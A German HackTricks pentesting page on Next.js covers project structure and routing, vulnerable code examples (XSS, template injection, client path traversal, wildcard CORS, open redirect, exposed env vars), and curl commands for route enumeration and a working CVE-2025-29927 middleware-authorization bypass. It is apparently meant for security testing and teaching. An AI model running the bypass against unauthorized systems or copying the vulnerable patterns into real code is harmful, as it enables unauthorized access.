# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Architektur einer Next.js-Anwendung

### Typische Dateistruktur

Ein Standard-Next.js-Projekt folgt einer spezifischen Datei- und Verzeichnisstruktur, die Funktionen wie Routing, API-Endpunkte und Verwaltung statischer Assets erleichtert. Hier ist eine typische Struktur:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Kernverzeichnisse und -dateien

- **public/:** Hostet statische Assets wie Bilder, Schriftarten und andere Dateien. Dateien hier sind unter dem Root-Pfad (`/`) zugänglich.
- **app/:** Zentrales Verzeichnis für die Seiten, Layouts, Komponenten und API-Routen deiner Anwendung. Nutzt das **App Router**-Paradigma und ermöglicht erweiterte Routing-Funktionen sowie die Trennung von Server- und Client-Komponenten.
- **app/layout.tsx:** Definiert das Root-Layout deiner Anwendung, umschließt alle Seiten und stellt konsistente UI-Elemente wie Header, Footer und Navigationsleisten bereit.
- **app/page.tsx:** Dient als Einstiegspunkt für die Root-Route `/` und rendert die Homepage.
- **app/[route]/page.tsx:** Behandelt statische und dynamische Routen. Jeder Ordner innerhalb von `app/` repräsentiert ein Routensegment, und die jeweilige `page.tsx` innerhalb dieser Ordner entspricht der Komponente der Route.
- **app/api/:** Enthält API-Routen und erlaubt es, serverless Funktionen zu erstellen, die HTTP-Anfragen verarbeiten. Diese Routen ersetzen das traditionelle `pages/api`-Verzeichnis.
- **app/components/:** Beinhaltet wiederverwendbare React-Komponenten, die in verschiedenen Seiten und Layouts verwendet werden können.
- **app/styles/:** Enthält globale CSS-Dateien und CSS-Module für komponentenspezifisches Styling.
- **app/utils/:** Enthält Utility-Funktionen, Hilfs-Module und andere nicht-UI-Logik, die in der gesamten Anwendung geteilt werden können.
- **.env.local:** Speichert Umgebungsvariablen, die spezifisch für die lokale Entwicklungsumgebung sind. Diese Variablen werden **nicht** in die Versionskontrolle übernommen.
- **next.config.js:** Passt das Verhalten von Next.js an, einschließlich webpack-Konfigurationen, Umgebungsvariablen und Sicherheits-Einstellungen.
- **tsconfig.json:** Konfiguriert TypeScript-Einstellungen für das Projekt und ermöglicht Type-Checking sowie andere TypeScript-Features.
- **package.json:** Verwaltet Projektabhängigkeiten, Skripte und Metadaten.
- **README.md:** Bietet Dokumentation und Informationen zum Projekt, einschließlich Setup-Anweisungen, Nutzungshinweisen und weiteren relevanten Details.
- **yarn.lock / package-lock.json:** Sperren die Abhängigkeiten des Projekts auf spezifische Versionen und stellen so konsistente Installationen über verschiedene Umgebungen sicher.

## Client-Seite in Next.js

### Dateibasiertes Routing im `app`-Verzeichnis

Das `app`-Verzeichnis ist der Eckpfeiler des Routings in den aktuellen Next.js-Versionen. Es nutzt das Dateisystem zur Definition von Routen und macht die Verwaltung von Routen intuitiv und skalierbar.

<details>

<summary>Behandlung des Root-Pfads /</summary>

**Dateistruktur:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Wichtige Dateien:**

- **`app/page.tsx`**: Verarbeitet Anfragen an den Root-Pfad `/`.
- **`app/layout.tsx`**: Definiert das Layout für die Anwendung und umfasst alle Seiten.

**Implementierung:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Erklärung:**

- **Routen-Definition:** Die Datei `page.tsx` direkt im `app`-Verzeichnis entspricht der `/` Route.
- **Darstellung:** Diese Komponente zeigt den Inhalt der Startseite an.
- **Layout-Integration:** Die Komponente `HomePage` wird von `layout.tsx` umschlossen; dort können Kopf- und Fußzeilen sowie andere gemeinsame Elemente integriert werden.

</details>

<details>

<summary>Umgang mit anderen statischen Pfaden</summary>

**Beispiel: `/about` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Erklärung:**

- **Routen-Definition:** Die `page.tsx`-Datei im `about`-Ordner entspricht der Route `/about`.
- **Darstellung:** Diese Komponente rendert den Inhalt der About-Seite.

</details>

<details>

<summary>Dynamische Routen</summary>

Dynamische Routen ermöglichen die Verarbeitung von Pfaden mit variablen Segmenten und erlauben es Anwendungen, Inhalte basierend auf Parametern wie IDs, slugs usw. anzuzeigen.

**Beispiel: `/posts/[id]`-Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Erläuterung:**

- **Dynamisches Segment:** `[id]` kennzeichnet ein dynamisches Segment in der Route und erfasst den `id`-Parameter aus der URL.
- **Zugriff auf Parameter:** Das `params`-Objekt enthält die dynamischen Parameter und ist innerhalb der Komponente zugänglich.
- **Routenabgleich:** Jeder Pfad, der `/posts/*` entspricht, z. B. `/posts/1`, `/posts/abc` usw., wird von dieser Komponente behandelt.

</details>

<details>

<summary>Verschachtelte Routen</summary>

Next.js unterstützt verschachtelte Routing-Strukturen, die hierarchische Routen ermöglichen und das Verzeichnislayout widerspiegeln.

**Beispiel: `/dashboard/settings/profile` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Erklärung:**

- **Tiefe Verschachtelung:** Die Datei `page.tsx` innerhalb von `dashboard/settings/profile/` entspricht der Route `/dashboard/settings/profile`.
- **Hierarchieabbildung:** Die Verzeichnisstruktur spiegelt den URL-Pfad wider und verbessert die Wartbarkeit und Übersichtlichkeit.

</details>

<details>

<summary>Catch-All-Routen</summary>

Catch-All-Routen behandeln mehrere verschachtelte Segmente oder unbekannte Pfade und bieten Flexibilität in der Routenbehandlung.

**Beispiel: `/*` Route**

**Dateistruktur:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Erklärung:**

- **Catch-All-Segment:** `[...slug]` erfasst alle verbleibenden Pfadsegmente als Array.
- **Verwendung:** Nützlich zum Umgang mit dynamischen Routing-Szenarien wie von Benutzern erstellten Pfaden, verschachtelten Kategorien usw.
- **Routenabgleich:** Pfade wie `/anything/here`, `/foo/bar/baz`, usw. werden von dieser Komponente behandelt.

</details>

### Potenzielle clientseitige Schwachstellen

Während Next.js eine sichere Grundlage bietet, können unsachgemäße Programmierpraktiken Schwachstellen einführen. Wichtige clientseitige Schwachstellen sind unter anderem:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS-Angriffe treten auf, wenn bösartige Skripte in vertrauenswürdige Websites eingeschleust werden. Angreifer können Skripte im Browser der Benutzer ausführen, Daten stehlen oder Aktionen im Namen des Benutzers durchführen.

**Beispiel für verwundbaren Code:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Warum es verwundbar ist:** Die Verwendung von `dangerouslySetInnerHTML` mit nicht vertrauenswürdigen Eingaben ermöglicht es Angreifern, bösartige Skripte einzuschleusen.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Tritt auf, wenn Benutzereingaben in Templates nicht richtig behandelt werden, wodurch Angreifer Templates oder Ausdrücke injizieren und ausführen können.

**Beispiel für verwundbaren Code:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Warum es verwundbar ist:** Wenn `template` oder `data` bösartigen Inhalt enthalten, kann das zur Ausführung von unbeabsichtigtem Code führen.

</details>

<details>

<summary>Client Path Traversal</summary>

Es handelt sich um eine Schwachstelle, die es Angreifern ermöglicht, clientseitige Pfade zu manipulieren, um unbeabsichtigte Aktionen durchzuführen, wie zum Beispiel Cross-Site Request Forgery (CSRF). Im Gegensatz zu server-side path traversal, das auf das Dateisystem des Servers abzielt, konzentriert sich CSPT darauf, clientseitige Mechanismen auszunutzen, um legitime API-Anfragen auf bösartige Endpunkte umzuleiten.

**Beispiel für verwundbaren Code:**

Eine Next.js-Anwendung erlaubt es Benutzern, Dateien hoch- und herunterzuladen. Die Download-Funktion ist auf der Client-Seite implementiert, wobei Benutzer den Dateipfad angeben können, den sie herunterladen möchten.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Angriffsszenario

1. **Attacker's Objective**: Führe einen CSRF-Angriff aus, um eine kritische Datei (z. B. `admin/config.json`) zu löschen, indem der `filePath` manipuliert wird.
2. **Exploiting CSPT**:
- **Malicious Input**: Der Angreifer erstellt eine URL mit einem manipulierten `filePath`, z. B. `../deleteFile/config.json`.
- **Resulting API Call**: Der clientseitige Code führt eine Anfrage an `/api/files/../deleteFile/config.json` aus.
- **Server's Handling**: Wenn der Server den `filePath` nicht validiert, verarbeitet er die Anfrage und kann dadurch sensible Dateien löschen oder offenlegen.
3. **Executing CSRF**:
- **Crafted Link**: Der Angreifer sendet dem Opfer einen Link oder bettet ein bösartiges Skript ein, das die Download-Anfrage mit dem manipulierten `filePath` auslöst.
- **Outcome**: Das Opfer führt die Aktion unwissentlich aus, was zu unautorisiertem Datei-Zugriff oder -Löschung führt.

</details>

### Recon: Erkennung von statischen Export-Routen via _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Verwende die entdeckten Pfade (zum Beispiel `/docs`, `/docs/content/examples`, `/signin`), um auth testing und endpoint discovery zu steuern.

## Server-seitig in Next.js

### Server-seitiges Rendering (SSR)

Seiten werden bei jeder Anfrage auf dem Server gerendert, wodurch der Benutzer vollständig gerendertes HTML erhält. In diesem Fall solltest du deinen eigenen Custom-Server erstellen, um die Anfragen zu verarbeiten.

**Use Cases:**

- Dynamische Inhalte, die sich häufig ändern.
- SEO-Optimierung, da Suchmaschinen die vollständig gerenderte Seite crawlen können.

**Implementierung:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statische Seitengenerierung (SSG)

Seiten werden zur Build-Zeit vorgerendert, was schnellere Ladezeiten und geringere Serverbelastung zur Folge hat.

**Anwendungsfälle:**

- Inhalte, die sich nicht häufig ändern.
- Blogs, Dokumentation, Marketingseiten.

**Implementierung:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverlose Funktionen (API Routes)

Next.js ermöglicht die Erstellung von API-Endpunkten als serverlose Funktionen. Diese Funktionen werden bei Bedarf ausgeführt, ohne dass ein dedizierter Server erforderlich ist.

**Anwendungsfälle:**

- Verarbeitung von Formularübermittlungen.
- Interaktion mit Datenbanken.
- Verarbeitung von Daten oder Integration mit Drittanbieter-APIs.

**Implementierung:**

Mit der Einführung des `app`-Verzeichnisses in Next.js 13 sind Routing und API-Verarbeitung flexibler und leistungsfähiger geworden. Dieser moderne Ansatz steht in engem Einklang mit dem dateibasierten Routing-System, führt jedoch erweiterte Möglichkeiten ein, einschließlich Unterstützung für Server- und Client-Komponenten.

#### Grundlegender Route-Handler

**Dateistruktur:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementierung:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Erklärung:**

- **Location:** API-Routen befinden sich im Verzeichnis `app/api/`.
- **File Naming:** Jeder API-Endpunkt liegt in einem eigenen Ordner, der eine `route.js` oder `route.ts`-Datei enthält.
- **Exported Functions:** Anstatt eines einzelnen default-Exports werden spezifische HTTP-Methodenfunktionen (z. B. `GET`, `POST`) exportiert.
- **Response Handling:** Verwende den `Response`-Konstruktor, um Antworten zurückzugeben; dadurch hast du mehr Kontrolle über Header und Statuscodes.

#### Umgang mit anderen Pfaden und Methoden:

<details>

<summary>Behandlung spezifischer HTTP-Methoden</summary>

Next.js 13+ ermöglicht es, Handler für spezifische HTTP-Methoden innerhalb derselben `route.js`- oder `route.ts`-Datei zu definieren, was zu klarerem und besser organisiertem Code führt.

**Beispiel:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Erläuterung:**

- **Mehrere Exporte:** Jede HTTP-Methode (`GET`, `PUT`, `DELETE`) hat ihre eigene exportierte Funktion.
- **Parameter:** Das zweite Argument bietet Zugriff auf Routenparameter über `params`.
- **Erweiterte Antworten:** Größere Kontrolle über Response-Objekte, wodurch präzises Setzen von Headern und Statuscodes möglich wird.

</details>

<details>

<summary>Catch-All- und verschachtelte Routen</summary>

Next.js 13+ unterstützt erweiterte Routing-Funktionen wie Catch-All-Routen und verschachtelte API-Routen, wodurch dynamischere und skalierbarere API-Strukturen möglich sind.

**Catch-All Route Example:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Erklärung:**

- **Syntax:** `[...]` steht für ein Catch-All-Segment und fängt alle verschachtelten Pfade ein.
- **Verwendung:** Nützlich für APIs, die unterschiedliche Routen-Tiefen oder dynamische Segmente verarbeiten müssen.

**Beispiel für verschachtelte Routen:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Erklärung:**

- **Deep Nesting:** Ermöglicht hierarchische API-Strukturen, die Ressourcenbeziehungen widerspiegeln.
- **Parameterzugriff:** Einfacher Zugriff auf mehrere Routenzparameter über das `params`-Objekt.

</details>

<details>

<summary>Umgang mit API-Routen in Next.js 12 and Earlier</summary>

## API-Routen im `pages` Verzeichnis (Next.js 12 and Earlier)

Bevor Next.js 13 das `app`-Verzeichnis und erweiterte Routing-Funktionen einführte, wurden API-Routen hauptsächlich im `pages`-Verzeichnis definiert. Dieser Ansatz wird weiterhin häufig verwendet und in Next.js 12 und früheren Versionen unterstützt.

#### Grundlegende API-Route

**Dateistruktur:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementierung:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Erklärung:**

- **Ort:** API-Routen befinden sich im Verzeichnis `pages/api/`.
- **Export:** Verwende `export default`, um die Handler-Funktion zu definieren.
- **Funktionssignatur:** Der Handler erhält die Objekte `req` (HTTP-Anfrage) und `res` (HTTP-Antwort).
- **Routing:** Der Dateiname (`hello.js`) entspricht dem Endpunkt `/api/hello`.

#### Dynamische API-Routen

**Dateistruktur:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementierung:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Erklärung:**

- **Dynamische Segmente:** Eckige Klammern (`[id].js`) kennzeichnen dynamische Routen-Segmente.
- **Zugriff auf Parameter:** Verwende `req.query.id`, um auf den dynamischen Parameter zuzugreifen.
- **Methoden handhaben:** Verwende bedingte Logik, um verschiedene HTTP-Methoden (`GET`, `PUT`, `DELETE`, etc.) zu behandeln.

#### Unterschiedliche HTTP-Methoden handhaben

Während das grundlegende API-Route-Beispiel alle HTTP-Methoden innerhalb einer einzigen Funktion behandelt, kannst du den Code so strukturieren, dass jede Methode explizit behandelt wird, was die Übersichtlichkeit und Wartbarkeit verbessert.

**Beispiel:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Bewährte Vorgehensweisen:**

- **Trennung der Verantwortlichkeiten:** Trenne die Logik für verschiedene HTTP-Methoden klar voneinander.
- **Antwortkonsistenz:** Stelle konsistente Antwortstrukturen sicher, um die clientseitige Verarbeitung zu erleichtern.
- **Fehlerbehandlung:** Behandle nicht unterstützte Methoden und unerwartete Fehler elegant.

</details>

### CORS-Konfiguration

Kontrolliere, welche Ursprünge auf deine API-Routen zugreifen können, um Cross-Origin Resource Sharing (CORS)-Schwachstellen zu mindern.

**Schlechtes Konfigurationsbeispiel:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Beachte, dass **CORS auch in allen API-Routen konfiguriert werden kann** innerhalb der **`middleware.ts`**-Datei:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problem:**

- **`Access-Control-Allow-Origin: '*'`:** Ermöglicht jeder Website den Zugriff auf die API, wodurch bösartige Seiten möglicherweise ohne Einschränkungen mit deiner API interagieren können.
- **Weite Methodenfreigabe:** Das Zulassen aller Methoden kann es Angreifern ermöglichen, unerwünschte Aktionen durchzuführen.

**Wie Angreifer es ausnutzen:**

Angreifer können bösartige Websites erstellen, die Anfragen an deine API stellen und dabei Funktionen missbrauchen wie Datenabruf, Datenmanipulation oder das Auslösen unerwünschter Aktionen im Namen authentifizierter Benutzer.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Offenlegung von Server-Code auf der Client-Seite

Es kann leicht passieren, dass man **Code, der auf dem Server verwendet wird, auch im klientenseitigen, offen exponierten Code nutzt**. Die beste Möglichkeit, sicherzustellen, dass eine Code-Datei niemals auf der Client-Seite offengelegt wird, ist die Verwendung dieses Imports am Anfang der Datei:
```js
import "server-only"
```
## Schlüsseldateien und ihre Rollen

### `middleware.ts` / `middleware.js`

**Standort:** Root des Projekts oder innerhalb von `src/`.

**Zweck:** Führt Code in der serverseitigen Serverless-Funktion aus, bevor eine Anfrage verarbeitet wird, und ermöglicht Aufgaben wie Authentifizierung, Weiterleitungen oder das Ändern von Antworten.

**Ablauf:**

1. **Eingehende Anfrage:** Die Middleware fängt die Anfrage ab.
2. **Verarbeitung:** Führt Operationen basierend auf der Anfrage durch (z. B. Authentifizierungsprüfung).
3. **Antwortmodifikation:** Kann die Antwort ändern oder die Kontrolle an den nächsten Handler weitergeben.

**Beispielanwendungsfälle:**

- Weiterleitung von nicht authentifizierten Nutzern.
- Hinzufügen benutzerdefinierter Header.
- Protokollierung von Anfragen.

**Beispielkonfiguration:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Umgehung der Middleware-Autorisierung (CVE-2025-29927)

Wenn Autorisierung in der Middleware durchgesetzt wird, können betroffene Next.js-Releases (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) durch Injizieren des Headers `x-middleware-subrequest` umgangen werden. Das Framework überspringt die Middleware-Rekursion und liefert die geschützte Seite zurück.

- Das Standardverhalten ist typischerweise ein 307 Redirect zu einer Login-Route wie `/api/auth/signin`.
- Sende einen langen `x-middleware-subrequest`-Wert (wiederhole `middleware`, um `MAX_RECURSION_DEPTH` zu erreichen), um die Antwort auf 200 zu ändern:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Da authentifizierte Seiten viele Subressourcen laden, füge den Header zu jeder Anfrage hinzu (z. B. Burp Match/Replace mit einem leeren Match-String), um zu verhindern, dass Assets umgeleitet werden.

### `next.config.js`

**Location:** Speicherort: Stammverzeichnis des Projekts.

**Purpose:** Zweck: Konfiguriert das Verhalten von Next.js, aktiviert oder deaktiviert Features, passt webpack-Konfigurationen an, setzt Umgebungsvariablen und konfiguriert mehrere Sicherheitsfunktionen.

**Key Security Configurations:** Wichtige Sicherheitskonfigurationen:

<details>

<summary>Sicherheits-Header</summary>

Sicherheits-Header verbessern die Sicherheit Ihrer Anwendung, indem sie Browser anweisen, wie Inhalte gehandhabt werden sollen. Sie helfen, verschiedene Angriffe wie Cross-Site Scripting (XSS), Clickjacking und MIME type sniffing zu mindern:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Beispiele:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Einstellungen zur Bildoptimierung</summary>

Next.js optimiert Bilder für die Leistung, aber Fehlkonfigurationen können zu Sicherheitslücken führen, z. B. indem sie nicht vertrauenswürdigen Quellen erlauben, bösartigen Inhalt einzuschleusen.

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Problem:**

- **`'*'`:** Erlaubt das Laden von Bildern von beliebigen externen Quellen, einschließlich nicht vertrauenswürdiger oder bösartiger Domains. Angreifer können Bilder hosten, die schädliche Payloads enthalten oder Benutzer irreführen.
- Ein weiteres Problem kann darin bestehen, eine Domain zuzulassen, **auf der jeder ein Bild hochladen kann** (z. B. `raw.githubusercontent.com`)

**Wie Angreifer es ausnutzen:**

Durch das Einfügen von Bildern aus bösartigen Quellen können Angreifer Phishing-Angriffe durchführen, irreführende Informationen anzeigen oder Schwachstellen in Bild-Rendering-Bibliotheken ausnutzen.

</details>

<details>

<summary>Offenlegung von Umgebungsvariablen</summary>

Verwalte sensible Informationen wie API-Schlüssel und Datenbank-Zugangsdaten sicher, ohne sie dem Client preiszugeben.

#### a. Offenlegung sensibler Variablen

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Not exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for exposure to client
},
}
```
**Problem:**

- **`SECRET_API_KEY`:** Ohne das Präfix `NEXT_PUBLIC_` macht Next.js Variablen nicht für den Client verfügbar. Wird es jedoch irrtümlich gesetzt (z. B. `NEXT_PUBLIC_SECRET_API_KEY`), wird die Variable auf der Client-Seite zugänglich.

**How attackers abuse it:**

Wenn sensible Variablen dem Client offengelegt werden, können Angreifer sie durch Inspektion des Client-Codes oder der Netzwerk-Anfragen abrufen und so unautorisierten Zugriff auf APIs, Datenbanken oder andere Dienste erlangen.

</details>

<details>

<summary>Redirects</summary>

Verwalte URL-Weiterleitungen und -Rewrites innerhalb deiner Anwendung, um sicherzustellen, dass Benutzer korrekt weitergeleitet werden, ohne open redirect vulnerabilities einzuführen.

#### a. Open Redirect Vulnerability

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problem:**

- **Dynamic Destination:** Ermöglicht Benutzern, beliebige URLs anzugeben, wodurch open redirect attacks möglich werden.
- **Trusting User Input:** Weiterleitungen zu von Benutzern bereitgestellten URLs ohne Validierung können zu phishing, malware distribution oder credential theft führen.

**Wie Angreifer es ausnutzen:**

Angreifer können URLs erstellen, die so aussehen, als kämen sie von Ihrer Domain, aber Benutzer zu bösartigen Sites weiterleiten. Zum Beispiel:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Benutzer, die der ursprünglichen Domain vertrauen, könnten unwissentlich auf schädliche Websites weitergeleitet werden.

</details>

<details>

<summary>Webpack Configuration</summary>

Passen Sie Webpack-Konfigurationen für Ihre Next.js-Anwendung an, was unbeabsichtigt Sicherheitslücken einführen kann, wenn es nicht sorgfältig gehandhabt wird.

#### a. Offenlegen sensibler Module

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
